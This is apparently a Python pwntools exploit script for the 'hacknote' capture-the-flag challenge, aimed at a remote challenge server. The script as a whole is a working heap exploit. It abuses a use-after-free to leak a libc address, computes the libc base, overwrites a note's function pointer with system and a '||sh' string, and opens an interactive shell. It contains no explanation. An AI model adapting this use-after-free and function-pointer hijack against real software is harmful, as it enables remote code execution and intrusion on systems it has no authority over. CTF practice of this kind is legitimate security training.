from pwn import *
p=process("./hacknote")
libc=ELF("/libc32.so")
e=ELF("./hacknote")
p=remote("111.198.29.45","34304")

context.log_level='debug'

def add(size,cont='\n'):
    p.recvuntil(":")
    p.sendline("1")
    p.recvuntil(":")
    p.sendline(str(size))
    p.recvuntil(":")
    p.send(cont)

def delete(idx):
    p.recvuntil(":")
    p.sendline("2")
    p.recvuntil(":")
    p.sendline(str(idx))

def show(idx):
    p.recvuntil(":")
    p.sendline("3")
    p.recvuntil(":")
    p.sendline(str(idx))

add(0x90)
add(0x20)

delete(0)
add(0x20)
show(0)
libc.address=u32(p.recv(4))-0x1b280a-0x2000-0x9c000+0xa0000
log.info(hex(libc.address))
delete(1)
delete(2)
add(0x8,p32(libc.address+0x3a940)+"||sh")
# add(0x8,p32(0x804862B)+p32(e.got['read']))
show(1)
p.recv()
print hex(libc.address)
p.interactive()

